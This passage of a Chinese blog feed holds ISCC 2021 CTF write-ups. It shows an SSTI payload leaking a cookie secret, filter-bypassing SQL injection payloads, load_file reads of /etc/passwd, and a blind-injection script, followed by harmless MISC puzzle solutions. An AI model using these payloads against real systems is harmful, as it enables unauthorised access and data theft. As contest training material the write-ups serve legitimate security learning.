class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Payload：error?msg=&#123;&#123;handler.settings&#125;&#125;<br></code></pre></td></tr></table></figure><p>得到cookie_secret的值<br><img src="https://img-blog.csdnimg.cn/20210503130744591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接使用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5value</span>(<span class="hljs-params">s</span>):</span><br>    md5 = hashlib.md5() <br>    md5.update(s) <br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jiami</span>():</span> <br>    filename = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>    cookie_secret =<span class="hljs-string">&quot;ef57c331-744f-4528-b434-9746317d4f6a&quot;</span><br>    print(<span class="hljs-string">&quot;md5(filename): &quot;</span>+md5value(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br>    x=md5value(filename.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    y=cookie_secret+x<br>    print(<span class="hljs-string">&quot;md5(cookie_secret+md5(filename)): &quot;</span>+md5value(y.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br> <br> <br>jiami()<br><br><br><span class="hljs-keyword">import</span> hashlib<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5value</span>(<span class="hljs-params">s</span>):</span><br>    md5 = hashlib.md5()<br>    md5.update(s.encode())<br>    <span class="hljs-keyword">return</span> md5.hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">jiami</span>():</span><br>    filename = <span class="hljs-string">&#x27;/fllllllllllllaaaaaag&#x27;</span><br>    cookie_secret =<span class="hljs-string">&quot;ef57c331-744f-4528-b434-9746317d4f6a&quot;</span><br>    print(md5value(cookie_secret + md5value(filename)))<br><br>jiami()<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">md5(filename): 9395bd4a7a7cae3ce1f6dc17aeb2d2b8<br>md5(cookie_secret+md5(filename)): 1ad9b8e09fbe539bc5a6f2c8bc0ab5db<br></code></pre></td></tr></table></figure><p>最终payload为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">/file?filename=/fllllllllllllaaaaaag&amp;filehash=1ad9b8e09fbe539bc5a6f2c8bc0ab5db<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210503131310534.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>简单的web<br>题目入口：<a href="http://39.96.91.106:5001/">http://39.96.91.106:5001/</a><br>Flag格式：iscc{XXX}</p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!--?id--&gt;<br></code></pre></td></tr></table></figure><p>测试一下，id=1，2，3页面均返回数据，其它返回error</p><p>万能密码<code>?id=1&#39; or 1=1#</code>，返回die<br><img src="https://img-blog.csdnimg.cn/20210519163721103.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>测试了一下，使用<code>?id=1&#39;||1=1%23</code>成功返回数据<br><img src="https://img-blog.csdnimg.cn/20210519163828121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>fuzz一下，过滤了好多</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">select、 union、 or、 ord 、 from、information_schema、空格等<br></code></pre></td></tr></table></figure><p>好多代替空格的都被过滤了，仅剩%0d没有过滤<br>select过滤了，使用seselectlect双写绕过</p><p>得到回显位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,2,3%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:2</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>爆库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,database(),version()%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:iscc_web</span><br><span class="hljs-string">#Your Password:5.7.33-0ubuntu0.16.04.1</span><br></code></pre></td></tr></table></figure><p>发现当前数据库版本为5.7.33</p><p>接下来就是爆表名</p><p>from、information_schema都被过滤了，FROM大写绕过，关于绕过information_schema参考<a href="https://blog.csdn.net/m0_49835838/article/details/109159839">mysql注入绕过information_schema过滤</a>。</p><p>当前数据库版本为5.7，可用<code>sys.schema_auto_increment_columns</code>代替<code>information_schema</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Paylaod: ?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dgroup_concat(table_name)%0dFrom%0dsys.schema_auto_increment_columns),3%0d%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:iscc_flag</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>猜测列名为flag,爆值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Paylaod: ?id=0<span class="hljs-string">&#x27;%0dununionion%0dselselectect%0d1,(selselectect%0dflag%0dFROM%0discc_flag),3%0d%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#Your Login name:cccmd.php</span><br><span class="hljs-string">#Your Password:3</span><br></code></pre></td></tr></table></figure><p>访问cccmd.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[zxcvbMnlkjhgfsaoiuytreq]+|[ZXCVBNLKKJHGFSAOIUYTREQ]+|[0123456789]+|\(|\/|\*|\-|\+|\.|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\?|\&gt;|\&lt;|\,|\)|\(|\&amp;|\^|\%|\#|\@|\!/&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>       <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;die!!&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$c</span>`;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;!--flllllllllaaag.php--&gt;<br></code></pre></td></tr></table></figure><p>显然flag在flllllllllaaag.php中，首先要知道当前路径，执行pwd，得到当前绝对路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">/cccmd.php?c=<span class="hljs-built_in">pwd</span><br><span class="hljs-comment">#/var/www/const</span><br></code></pre></td></tr></table></figure><p>load_file函数没有被过滤，尝试读取<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0duniunionon%0dselselectect%0d1,(load_file(&#x27;</span>/etc/passwd<span class="hljs-string">&#x27;)),3%23</span><br></code></pre></td></tr></table></figure><p>成功读取<br><img src="https://img-blog.csdnimg.cn/20210519171130283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>路径知道了，接下来直接读取flllllllllaaag.php</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">?id=0<span class="hljs-string">&#x27;%0duniunionon%0dselselectect%0d1,(load_file(&#x27;</span>/var/www/const/flllllllllaaag.php<span class="hljs-string">&#x27;)),3%23</span><br><span class="hljs-string"></span><br><span class="hljs-string">#F12查看源码得到&lt;?php$flag=&quot;iscc&#123;eeeeeasy_web!!666666&#125;&quot;</span><br></code></pre></td></tr></table></figure><p>贴一下<a href="https://www.cnblogs.com/w0s1np/p/14782626.html">大师傅</a>的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://39.96.91.106:5001/?id=&quot;</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br>i = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> (<span class="hljs-literal">True</span>):<br>    i = i + <span class="hljs-number">1</span><br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br><br>    <span class="hljs-keyword">while</span> (head &lt; tail):<br>        mid = (head + tail) &gt;&gt; <span class="hljs-number">1</span><br><br>        payload = <span class="hljs-string">&quot;0%27||if(ascii(substr((seselectlect%0dhex(load_file(0x2f7661722f7777772f636f6e73742f666c6c6c6c6c6c6c6c6c616161672e706870))),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        r = requests.get(url + payload)<br>        r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br>        <span class="hljs-comment"># print(url+payload)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Your Login name&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            head = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># print(r.text)</span><br>            tail = mid<br><br>    last = result<br><br>    <span class="hljs-keyword">if</span> head != <span class="hljs-number">32</span>:<br>        result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">break</span><br>    print(result)<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">3C3F7068700D0A24666C61673D22697363637B65656565656173795F77656221213636363636367D223B0D0A3F3E<br></code></pre></td></tr></table></figure><p>然后hex转字符串即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">m=<span class="hljs-string">&quot;3C3F7068700D0A24666C61673D22697363637B65656565656173795F77656221213636363636367D223B0D0A3F3E&quot;</span><br>s=<span class="hljs-built_in">bytes</span>.fromhex(m)<br>print(s)<br><br><span class="hljs-comment">#b&#x27;&lt;?php\r\n$flag=&quot;iscc&#123;eeeeeasy_web!!666666&#125;&quot;;\r\n?&gt;&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h1 id=&quot;练武&quot;&gt;&lt;a href=&quot;#练武&quot; class=&quot;headerlink&quot; title=&quot;练武&quot;&gt;&lt;/a&gt;练武&lt;/h1&gt;&lt;h2 id=&quot;ISCC客服冲冲冲（一）&quot;&gt;&lt;a href=&quot;#ISCC客服冲冲冲（一）&quot; class=&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021 MISC WP</title>
    <link href="http://atkx.top/2021/05/26/ISCC2021-MISC-WP/"/>
    <id>http://atkx.top/2021/05/26/ISCC2021-MISC-WP/</id>
    <published>2021-05-25T16:06:53.000Z</published>
    <updated>2021-08-15T03:59:06.637Z</updated>
    
    <content type="html"><![CDATA[ <a id="more"></a><h2 id="练武"><a href="#练武" class="headerlink" title="练武"></a>练武</h2><h3 id="李华的红包"><a href="#李华的红包" class="headerlink" title="李华的红包"></a>李华的红包</h3><blockquote><p>题目描述：<br>大年初一，李华给爸爸拜年，从事计算机行业的父亲发给李华一张图片和一张银行卡。父亲告诉李华密码就藏在图片中，但是李华打开图片后却百思不得其解。你能帮助李华拿到密码吗？</p></blockquote><p>下载附件，<br><img src="https://img-blog.csdnimg.cn/20210517174752113.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>直接binwalk分离得到hongbao.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">24</span>,<span class="hljs-number">43</span>,<span class="hljs-number">13</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">21</span>,<span class="hljs-number">43</span><br></code></pre></td></tr></table></figure><p>没啥思路，看起来图片不完全，修改图片高度，图片下面有一个鼓，联想到敲击码<br><img src="https://img-blog.csdnimg.cn/20210517175032487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>对照敲击码表<br><img src="https://img-blog.csdnimg.cn/20210517175209329.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>转换得到<code>ISCCBFS</code>，有点坑，说是银行卡密码，其实并不是六位数字，最终flag为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCC&#123;ISCCBFS&#125;<br></code></pre></td></tr></table></figure><h3 id="Retrieve-the-passcode"><a href="#Retrieve-the-passcode" class="headerlink" title="Retrieve the passcode"></a>Retrieve the passcode</h3><blockquote><p>题目描述：<br>Scatter说他能解开这个古怪的密码，你呢？来试试吧！ Flag格式：ISCC{XXX}，XXX为小写字符串，不包括空格</p></blockquote><p>xyz.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">1</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">2</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">1.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">4</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">3</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">6</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">5</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">7.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">8</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">2.25</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">2</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">1.75</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.25</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.5</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">9.75</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">10</span>:<span class="hljs-number">1.5</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.25</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.5</span>:<span class="hljs-number">3</span>:<span class="hljs-number">1</span>  <br><span class="hljs-number">11.75</span>:<span 